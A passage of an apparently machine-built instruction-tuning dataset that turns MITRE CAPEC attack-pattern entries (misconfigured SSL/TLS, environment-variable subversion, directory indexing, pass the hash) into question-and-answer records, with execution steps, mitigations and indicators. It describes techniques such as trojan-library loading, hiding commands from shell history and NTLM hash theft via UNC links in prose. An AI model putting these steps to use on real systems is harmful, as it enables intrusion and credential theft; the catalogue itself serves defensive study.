            "Submission_Date": "2019-04-04"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated @Status, Example_Instances, References, Related_Attack_Patterns, Related_Weaknesses, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Execution_Flow"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "How can I implement attack pattern - Exploiting Incorrectly Configured SSL/TLS (CAPEC ID: 217)",
    "context": "",
    "output": "Examples of Exploiting Incorrectly Configured SSL/TLS (CAPEC ID: 217) are: Using MITM techniques, an adversary launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the adversary to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "Using MITM techniques, an adversary launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the adversary to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.",
      "@Name": "Exploiting Incorrectly Configured SSL/TLS (CAPEC ID: 217)",
      "attack_ptrn": {
        "@ID": "217",
        "@Name": "Exploiting Incorrectly Configured SSL/TLS",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary takes advantage of incorrectly configured SSL/TLS communications that enables access to data intended to be encrypted. The adversary may also use this type of attack to inject commands or other traffic into the encrypted stream to cause compromise of either the client or server.",
        "Extended_Description": "SSL/TLS communications become vulnerable to this attack when they use outdated versions and insecure ciphers. Currently, all SSL versions are deprecated and TLS versions 1.0 and 1.1 are also deprecated due to being insecure. It is still possible for later versions of TLS to be insecure if they are configured with insecure ciphers such as 3DES or RC4.",
        "Likelihood_Of_Attack": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "216"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine SSL/TLS Configuration] Determine the SSL/TLS configuration of either the server or client being targeted, preferably both. This is not a hard requirement, as the adversary can simply assume commonly exploitable configuration settings and indiscriminately attempt them.",
              "Technique": "If the target is a webpage, some of the SSL/TLS configuration can be viewed through the browser's security information, such as the key sizes and cipher being used."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Intercept Communication] Provide controlled access to the server by the client, by either providing a link for the client to click on, or by positioning one's self at a place on the network to intercept and control the flow of data between client and server, e.g. AiTM (adversary in the middle - CAPEC-94).",
              "Technique": [
                "Create a malicious webpage that looks identical to the target webpage, but routes client traffic to the server such that the adversary can observe the traffic and perform an adverary in the middle attack.",
                "If the adversary has access to the network that either the client or server is on, the can attempt to use a packet sniffer to perform an adversary in the middle attack.",
                "Install a packet sniffer through malware directly to a client device that can intercept SSL/TLS traffic and perform an adversary in the middle attack."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Capture or Manipulate Sensitive Data] Once the adversary has the ability to intercept the secure communication, they exploit the incorrectly configured SSL to view the encrypted communication. The adversary can choose to just record the secure communication or manipulate the data to achieve a desired effect.",
              "Technique": [
                "Use known exploits for old SSL and TLS versions.",
                "Use known exploits for weak ciphers such as DES and RC4."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "Access to the client/server stream."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "The adversary needs real-time access to network traffic in such a manner that the adversary can grab needed information from the SSL stream, possibly influence the decided-upon encryption method and options, and perform automated analysis to decipher encrypted material recovered. Tools exist to automate part of the tasks, but to successfully use these tools in an attack scenario requires detailed understanding of the underlying principles."
          }
        },
        "Resources_Required": {
          "Resource": "The adversary needs the ability to sniff traffic, and optionally be able to route said traffic to a system where the sniffing of traffic can take place, and act upon the recovered traffic in real time."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Do not use SSL, as all SSL versions have been broken and should not be used. If TLS is not an option for the client or server, consider setting timeouts on SSL sessions to extremely low values to lessen the potential impact.",
            "Only use TLS version 1.2+, as versions 1.0 and 1.1 are insecure.",
            "Configure TLS to use secure algorithms. The current recommendation is to use ECDH, ECDSA, AES256-GCM, and SHA384 for the most security."
          ]
        },
        "Example_Instances": {
          "Example": "Using MITM techniques, an adversary launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the adversary to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "201"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Description Summary"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated @Name, Description, Example_Instances, Execution_Flow, Extended_Description, Mitigations, Resources_Required, Skills_Required"
            }
          ],
          "Previous_Entry_Name": [
            {
              "@Date": "2015-12-07",
              "#text": "Exploiting Incorrectly Configured SSL Security Levels"
            },
            {
              "@Date": "2022-02-22",
              "#text": "Exploiting Incorrectly Configured SSL"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Subverting Environment Variable Values (CAPEC ID: 13), give me an example instances for this pattern",
    "context": "",
    "output": "Sure. Examples can be: Changing the LD_LIBRARY_PATH environment variable in TELNET will cause TELNET to use an alternate (possibly Trojan) version of a function library. The Trojan library must be accessible using the target file system and should include Trojan code that will allow the user to log in with a bad password. This requires that the adversary upload the Trojan library to a specific location on the target. As an alternative to uploading a Trojan file, some file systems support file paths that include remote addresses, such as \\\\172.16.2.100\\shared_files\\trojan_dll.dll. See also: Path Manipulation (CVE-1999-0073)\n- The HISTCONTROL environment variable keeps track of what should be saved by the history command and eventually into the ~/.bash_history file when a user logs out. This setting can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". HISTCONTROL can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \" ls\" will not be saved, but \"ls\" would be saved by history. HISTCONTROL does not exist by default on macOS, but can be set by the user and will be respected. Adversaries can use this to operate without leaving traces by simply prepending a space to all of their terminal commands.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "Changing the LD_LIBRARY_PATH environment variable in TELNET will cause TELNET to use an alternate (possibly Trojan) version of a function library. The Trojan library must be accessible using the target file system and should include Trojan code that will allow the user to log in with a bad password. This requires that the adversary upload the Trojan library to a specific location on the target. As an alternative to uploading a Trojan file, some file systems support file paths that include remote addresses, such as \\\\172.16.2.100\\shared_files\\trojan_dll.dll. See also: Path Manipulation (CVE-1999-0073)",
        "The HISTCONTROL environment variable keeps track of what should be saved by the history command and eventually into the ~/.bash_history file when a user logs out. This setting can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". HISTCONTROL can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \" ls\" will not be saved, but \"ls\" would be saved by history. HISTCONTROL does not exist by default on macOS, but can be set by the user and will be respected. Adversaries can use this to operate without leaving traces by simply prepending a space to all of their terminal commands."
      ],
      "@Name": "Subverting Environment Variable Values (CAPEC ID: 13)",
      "attack_ptrn": {
        "@ID": "13",
        "@Name": "Subverting Environment Variable Values",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "The adversary directly or indirectly modifies environment variables used by or controlling the target software. The adversary's goal is to cause the target software to deviate from its expected operation in a manner that benefits the adversary.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "77"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "14"
            },
            {
              "@Nature": "PeerOf",
              "@CAPEC_ID": "10"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Probe target application] The adversary first probes the target application to determine important information about the target. This information could include types software used, software versions, what user input the application consumes, and so on. Most importantly, the adversary tries to determine what environment variables might be used by the underlying software, or even the application itself."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Find user-controlled environment variables] Using the information found by probing the application, the adversary attempts to manipulate any user-controlled environment variables they have found are being used by the application, or suspect are being used by the application, and observe the effects of these changes. If the adversary notices any significant changes to the application, they will know that a certain environment variable is important to the application behavior and indicates a possible attack vector.",
              "Technique": "Alter known environment variables such as \"$PATH\", \"$HOSTNAME\", or \"LD_LIBRARY_PATH\" and see if application behavior changes."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Manipulate user-controlled environment variables] The adversary manipulates the found environment variable(s) to abuse the normal flow of processes or to gain access to privileged resources."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "An environment variable is accessible to the user.",
            "An environment variable used by the application can be tainted with user supplied data.",
            "Input data used in an environment variable is not validated properly.",
            "The variables encapsulation is not done properly. For instance setting a variable as public in a class makes it visible and an adversary may attempt to manipulate that variable."
          ]
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Low",
              "#text": "In a web based scenario, the client controls the data that it submitted to the server. So anybody can try to send malicious data and try to bypass the authentication mechanism."
            },
            {
              "@Level": "High",
              "#text": "Some more advanced attacks may require knowledge about protocols and probing technique which help controlling a variable. The malicious user may try to understand the authentication mechanism in order to defeat it."
            }
          ]
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Bypass Protection Mechanism"
            },
            {
              "Scope": "Availability",
              "Impact": "Unreliable Execution"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Accountability",
              "Impact": "Hide Activities"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Protect environment variables against unauthorized read and write access.",
            "Protect the configuration files which contain environment variables against illegitimate read and write access.",
            "Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system.",
            "Apply the least privilege principles. If a process has no legitimate reason to read an environment variable do not give that privilege."
          ]
        },
        "Example_Instances": {
          "Example": [
            "Changing the LD_LIBRARY_PATH environment variable in TELNET will cause TELNET to use an alternate (possibly Trojan) version of a function library. The Trojan library must be accessible using the target file system and should include Trojan code that will allow the user to log in with a bad password. This requires that the adversary upload the Trojan library to a specific location on the target. As an alternative to uploading a Trojan file, some file systems support file paths that include remote addresses, such as \\\\172.16.2.100\\shared_files\\trojan_dll.dll. See also: Path Manipulation (CVE-1999-0073)",
            "The HISTCONTROL environment variable keeps track of what should be saved by the history command and eventually into the ~/.bash_history file when a user logs out. This setting can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". HISTCONTROL can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \" ls\" will not be saved, but \"ls\" would be saved by history. HISTCONTROL does not exist by default on macOS, but can be set by the user and will be respected. Adversaries can use this to operate without leaving traces by simply prepending a space to all of their terminal commands."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "353"
            },
            {
              "@CWE_ID": "285"
            },
            {
              "@CWE_ID": "302"
            },
            {
              "@CWE_ID": "74"
            },
            {
              "@CWE_ID": "15"
            },
            {
              "@CWE_ID": "73"
            },
            {
              "@CWE_ID": "20"
            },
            {
              "@CWE_ID": "200"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1562.003",
              "Entry_Name": "Impair Defenses:Impair Command History Logging"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1574.006",
              "Entry_Name": "Hijack Execution Flow:Dynamic Linker Hijacking"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1574.007",
              "Entry_Name": "Hijack Execution Flow:Path Interception by PATH Environment Variable"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-1"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attacker_Skills_or_Knowledge_Required, Examples-Instances, References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Example_Instances"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Consequences, Mitigations, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Example_Instances, Execution_Flow, Prerequisites"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Give me an usage example for attack pattern - Directory Indexing (CAPEC ID: 127)",
    "context": "",
    "output": "The adversary uses directory listing to view sensitive files in the application. This is an example of accessing the backup file. The attack issues a request for http://www.example.com/admin/ and receives the following dynamic directory indexing content in the response: Index of /admin Name Last Modified Size Description backup/ 31-May-2007 08:18 - Apache/ 2.0.55 Server at www.example.com Port 80\n- The target application does not have direct hyperlink to the \"backup\" directory in the normal html webpage, however the attacker has learned of this directory due to indexing the content. The client then requests the backup directory URL and receives output which has a \"db_dump.php\" file in it. This sensitive data should not be disclosed publicly.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "The adversary uses directory listing to view sensitive files in the application. This is an example of accessing the backup file. The attack issues a request for http://www.example.com/admin/ and receives the following dynamic directory indexing content in the response: Index of /admin Name Last Modified Size Description backup/ 31-May-2007 08:18 - Apache/ 2.0.55 Server at www.example.com Port 80",
        "The target application does not have direct hyperlink to the \"backup\" directory in the normal html webpage, however the attacker has learned of this directory due to indexing the content. The client then requests the backup directory URL and receives output which has a \"db_dump.php\" file in it. This sensitive data should not be disclosed publicly."
      ],
      "@Name": "Directory Indexing (CAPEC ID: 127)",
      "attack_ptrn": {
        "@ID": "127",
        "@Name": "Directory Indexing",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary crafts a request to a target that results in the target listing/indexing the content of a directory as output. One common method of triggering directory contents as output is to construct a request containing a path that terminates in a directory name rather than a file name since many applications are configured to provide a list of the directory's contents when such a request is received. An adversary can use this to explore the directory tree on a target as well as learn the names of files. This can often end up revealing test files, backup files, temporary files, hidden files, configuration files, user accounts, script contents, as well as naming conventions, all of which can be used by an attacker to mount additional attacks.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "54"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Directory Discovery] Use a method, either manual, scripted, or automated to discover the directories on the server by making requests for directories that may possibly exist. During this phase the adversary is less concerned with whether a directory can be accessed or indexed and more focused on simply discovering what directories do exist on the target.",
              "Technique": [
                "Send requests to the web server for common directory names",
                "If directories are discovered that are native to a server type further refine the directory search to include directories usually present on those types of servers.",
                "Search for uncommon or potentially user created directories that may be present."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Iteratively explore directory/file structures] The adversary attempts to access the discovered directories that allow access and may attempt to bypass server or application level ACLs by using manual or automated methods",
              "Technique": [
                "Use a scanner tool to dynamically add directories/files to include their scan based upon data obtained in initial probes.",
                "Use a browser to manually explore the website by issuing a request ending the URL in a slash '/'.",
                "Attempt to bypass ACLs on directories by using methods that known to work against some server types by appending data to the directory request. For instance, appending a Null byte to the end of the request which may cause an ACL to fail and allow access.",
                "Sequentially request a list of common base files to each directory discovered.",
                "Try multiple fuzzing techniques to list directory contents for directories that will not reveal their contents with a \"/\" request"
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Read directories or files which are not intended for public viewing.] The adversary attempts to access the discovered directories that allow access and may attempt to bypass server or application level ACLs by using manual or automated methods",
              "Technique": [
                "Try multiple exploit techniques to list directory contents for directories that will not reveal their contents with a \"/\" request",
                "Try other known exploits to elevate privileges sufficient to bypass protected directories.",
                "List the files in the directory by issuing a request with the URL ending in a \"/\" slash.",
                "Access the files via direct URL and capture contents.",
                "Attempt to bypass ACLs on directories by using methods that are known to work against some server types by appending data to the directory request. For instance, appending a Null byte to the end of the request which may cause an ACL to fail and allow access.",
                "Sequentially request a list of common base files to each directory discovered."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The target must be misconfigured to return a list of a directory's content when it receives a request that ends in a directory name rather than a file name.",
            "The adversary must be able to control the path that is requested of the target.",
            "The administrator must have failed to properly configure an ACL or has associated an overly permissive ACL with a particular directory.",
            "The server version or patch level must not inherently prevent known directory listing attacks from working."
          ]
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Low",
              "#text": "To issue the request to URL without given a specific file name"
            },
            {
              "@Level": "High",
              "#text": "To bypass the access control of the directory of listings"
            }
          ]
        },
        "Resources_Required": {
          "Resource": "Ability to send HTTP requests to a web application."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Read Data",
            "Note": "Information Leakage"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "1. Using blank index.html: putting blank index.html simply prevent directory listings from displaying to site visitors.",
            "2. Preventing with .htaccess in Apache web server: In .htaccess, write \"Options-indexes\".",
            "3. Suppressing error messages: using error 403 \"Forbidden\" message exactly like error 404 \"Not Found\" message."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "The adversary uses directory listing to view sensitive files in the application. This is an example of accessing the backup file. The attack issues a request for http://www.example.com/admin/ and receives the following dynamic directory indexing content in the response: Index of /admin Name Last Modified Size Description backup/ 31-May-2007 08:18 - Apache/ 2.0.55 Server at www.example.com Port 80",
              "The target application does not have direct hyperlink to the \"backup\" directory in the normal html webpage, however the attacker has learned of this directory due to indexing the content. The client then requests the backup directory URL and receives output which has a \"db_dump.php\" file in it. This sensitive data should not be disclosed publicly."
            ]
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "424"
            },
            {
              "@CWE_ID": "425"
            },
            {
              "@CWE_ID": "288"
            },
            {
              "@CWE_ID": "285"
            },
            {
              "@CWE_ID": "732"
            },
            {
              "@CWE_ID": "276"
            },
            {
              "@CWE_ID": "693"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1083",
            "Entry_Name": "File and Directory Discovery"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-11",
            "@Section": "WASC-16 - Directory Indexing"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated References, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Examples-Instances, Related_Vulnerabilities"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Give me an usage example for attack pattern - Use of Captured Hashes (Pass The Hash) (CAPEC ID: 644)",
    "context": "",
    "output": "Adversaries exploited the Zoom video conferencing application during the 2020 COVID-19 pandemic to exfiltrate Windows domain credential hash value pairs from a target system. The attack entailed sending Universal Naming Convention (UNC) paths within the Zoom chat window of an unprotected Zoom call. If the victim clicked on the link, their Windows usernames and the corresponding Net-NTLM-v2 hashes were sent to the address contained in the link. The adversary was then able to infiltrate and laterally move within the Windows domain by passing the acquired credentials to shared network resources. This further provided adversaries with access to Outlook servers and network storage devices. [REF-575]\n- Operation Soft Cell, which has been underway since at least 2012, leveraged a modified Mimikatz that dumped NTLM hashes. The acquired hashes were then used to authenticate to other systems within the network via Pass The Hash attacks. [REF-580]",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "Adversaries exploited the Zoom video conferencing application during the 2020 COVID-19 pandemic to exfiltrate Windows domain credential hash value pairs from a target system. The attack entailed sending Universal Naming Convention (UNC) paths within the Zoom chat window of an unprotected Zoom call. If the victim clicked on the link, their Windows usernames and the corresponding Net-NTLM-v2 hashes were sent to the address contained in the link. The adversary was then able to infiltrate and laterally move within the Windows domain by passing the acquired credentials to shared network resources. This further provided adversaries with access to Outlook servers and network storage devices. [REF-575]",
        "Operation Soft Cell, which has been underway since at least 2012, leveraged a modified Mimikatz that dumped NTLM hashes. The acquired hashes were then used to authenticate to other systems within the network via Pass The Hash attacks. [REF-580]"
      ],
      "@Name": "Use of Captured Hashes (Pass The Hash) (CAPEC ID: 644)",
      "attack_ptrn": {
        "@ID": "644",
        "@Name": "Use of Captured Hashes (Pass The Hash)",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary obtains (i.e. steals or purchases) legitimate Windows domain credential hash values to access systems within the domain that leverage the Lan Man (LM) and/or NT Lan Man (NTLM) authentication protocols.",
        "Extended_Description": {
          "xhtml:p": "When authenticating via LM or NTLM, an authenticating account's plaintext credentials are not required by the protocols for successful authentication. Instead, the hashed credentials are used to determine if an authentication attempt is valid. If an adversary can obtain an account's hashed credentials, the hash values can then be passed to a system or service to authenticate, without needing to brute-force the hashes to obtain their cleartext values. Successful Pass The Hash attacks result in the adversary fully authenticating as the targeted account, which can further allow the adversary to laterally move within the network, impersonate a legitimate user, and/or download/install malware to systems within the domain. This technique can be performed against any operating system that leverages the LM or NTLM protocols even if the operating system is not Windows-based, since these systems/accounts may still authenticate to a Windows domain."
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "653"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "151"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "165"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "549"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "545"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Acquire known Windows credential hash value pairs] The adversary must obtain known Windows credential hash value pairs of accounts that exist on the domain.",
              "Technique": [
                "An adversary purchases breached Windows credential hash value pairs from the dark web.",
                "An adversary conducts a sniffing attack to steal Windows credential hash value pairs as they are transmitted.",
                "An adversary gains access to a Windows domain system/files and exfiltrates Windows credential hash value pairs.",
                "An adversary examines outward-facing configuration and properties files to discover hardcoded Windows credential hash value pairs."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Attempt domain authentication] Try each Windows credential hash value pair until the target grants access.",
              "Technique": "Manually or automatically enter each Windows credential hash value pair through the target's interface."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Impersonate] An adversary can use successful experiments or authentications to impersonate an authorized user or system, or to laterally move within the domain"
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Spoofing] Malicious data can be injected into the target system or into other systems on the domain. The adversary can also pose as a legitimate domain user to perform social engineering attacks."
            },
            {
              "Step": "5",
              "Phase": "Exploit",
              "Description": "[Data Exfiltration] The adversary can obtain sensitive data contained within domain systems or applications."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The system/application is connected to the Windows domain.",
            "The system/application leverages the Lan Man (LM) and/or NT Lan Man (NTLM) authentication protocols.",
            "The adversary possesses known Windows credential hash value pairs that exist on the target domain."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "Once an adversary obtains a known Windows credential hash value pair, leveraging it is trivial."
          }
        },
        "Resources_Required": {
          "Resource": "A list of known Window credential hash value pairs for the targeted domain."
        },
        "Indicators": {
          "Indicator": [
            "Authentication attempts use credentials that have been used previously by the account in question.",
            "Authentication attempts are originating from IP addresses or locations that are inconsistent with the user's normal IP addresses or locations.",
            "Data is being transferred and/or removed from systems/applications within the network.",
            "Suspicious or Malicious software is downloaded/installed on systems within the domain.",
            "Messages from a legitimate user appear to contain suspicious links or communications not consistent with the user's normal behavior."
          ]
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authentication"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": [
                "Confidentiality",
                "Authorization"
              ],
              "Impact": "Read Data"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Prevent the use of Lan Man and NT Lan Man authentication on severs and apply patch KB2871997 to Windows 7 and higher systems.",
            "Leverage multi-factor authentication for all authentication services and prior to granting an entity access to the domain network.",
            "Monitor system and domain logs for abnormal credential access.",
            "Create a strong password policy and ensure that your system enforces this policy.",
            "Leverage system penetration testing and other defense in depth methods to determine vulnerable systems within a domain."
          ]
        },
        "Example_Instances": {
          "Example": [
            "Adversaries exploited the Zoom video conferencing application during the 2020 COVID-19 pandemic to exfiltrate Windows domain credential hash value pairs from a target system. The attack entailed sending Universal Naming Convention (UNC) paths within the Zoom chat window of an unprotected Zoom call. If the victim clicked on the link, their Windows usernames and the corresponding Net-NTLM-v2 hashes were sent to the address contained in the link. The adversary was then able to infiltrate and laterally move within the Windows domain by passing the acquired credentials to shared network resources. This further provided adversaries with access to Outlook servers and network storage devices. [REF-575]",
            "Operation Soft Cell, which has been underway since at least 2012, leveraged a modified Mimikatz that dumped NTLM hashes. The acquired hashes were then used to authenticate to other systems within the network via Pass The Hash attacks. [REF-580]"
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "522"
            },
            {
              "@CWE_ID": "836"
            },
            {
              "@CWE_ID": "308"
            },
            {
              "@CWE_ID": "294"
            },
            {
              "@CWE_ID": "308"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1550.002",
            "Entry_Name": "Use Alternate Authentication Material:Pass The Hash"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-575"
            },
            {
              "@External_Reference_ID": "REF-580"
            },
            {
              "@External_Reference_ID": "REF-581"
            },
            {
              "@External_Reference_ID": "REF-582"
            },
            {
              "@External_Reference_ID": "REF-583"
            }
          ]
        },
        "Content_History": {
          "Submission": {
